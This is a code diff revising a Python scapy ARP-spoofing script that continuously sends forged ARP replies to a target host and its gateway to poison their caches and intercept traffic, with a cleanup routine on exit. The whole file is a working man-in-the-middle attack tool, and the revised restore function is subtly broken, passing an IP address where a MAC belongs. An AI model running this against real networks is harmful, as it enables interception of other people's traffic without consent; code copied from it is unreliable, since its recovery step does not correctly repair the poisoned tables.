@@ -1,6 +1,6 @@
-#!/bin/python3
+﻿#!/bin/python3
 
-from scapy.all import *
+from scapy.all import ARP, Ether, send, getmacbyip, get_if_hwaddr
 import argparse
 import time
 import sys
@@ -15,23 +15,37 @@ def parse_arguments():
     parser.add_argument("-v", "--verbose", dest="verbose", action="store_true", help="Enable verbose output")
     return parser.parse_args()
 
-def spoofing(target_ip, spoof_ip):
+def spoofing(target_ip: str, spoof_ip: str, verb=False):
     target_mac = getmacbyip(target_ip)
     if target_mac is None:
         print(f"[-] Could not find mac address to IP address: {target_ip}")
         return
-    packet = ARP(op="is-at", pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+
+    spoof_mac = getmacbyip(spoof_ip)
+    if spoof_mac is None:
+        print(f"[-] Could not find mac address to IP address: {spoof_ip}")
+        return  
+
+    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     send(packet, verbose=False)
+    if verb:
+        print(f"[+] Send ARP response: {spoof_ip} is-at {target_mac} to {target_ip}")
 
-
-def restore(destination_ip, source_ip):
-    destination_mac = scapy.getmacbyip(destination_ip)
-    source_mac = scapy.getmacbyip(source_ip)
-    if destination_mac is None or source_mac is None:
+def restore(destination_ip, source_ip, verb=False):
+    destination_mac = getmacbyip(destination_ip)
+    if destination_mac is None:
         print(f"Could not find mac address to destination/source IP address")
         return
-    packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+
+    source_mac = getmacbyip(source_ip)
+    if source_mac is None:
+        print(f"Could not find mac address to destination/source IP address")
+        return
+
+    packet = ARP(op=2, pdst=destination_ip, hwdst=destination_ip, psrc=source_ip)
     send(packet, verbose=False)
+    if verb:
+        print(f"[+] Restored ARP entry for {destination_ip} to {source_ip}")
 
 def main():
     args = parse_arguments()
@@ -43,17 +57,18 @@ def main():
     verb = args.verbose
     
     try:
+        print(f"[+] Start of ArpSpoofing on interface {interface}")
         while True:
-            print("[*] Start of ArpSpoofing")
-            spoofing(target_ip, gateway_ip)
-            spoofing(gateway_ip, target_ip)
+            spoofing(target_ip, gateway_ip, verb)
+            spoofing(gateway_ip, target_ip, verb)
             time.sleep(pause)
     except KeyboardInterrupt:
-        print("[*] A key combination \"Ctrl+C\" has been pressed")
+        print("\n[+] Interruped by user")
         time.sleep(2)
-        print("[*] Please wait...Recovery in process")
-        restore(target_ip, gateway_ip)
-        restore(gateway_ip, target_ip)
+        print("[+] Recovering ARP tables ...")
+        restore(target_ip, gateway_ip, verb)
+        restore(gateway_ip, target_ip, verb)
+        print("[+] ARP tables recovered.Exit...")
 
 if __name__ == "__main__":
     main()
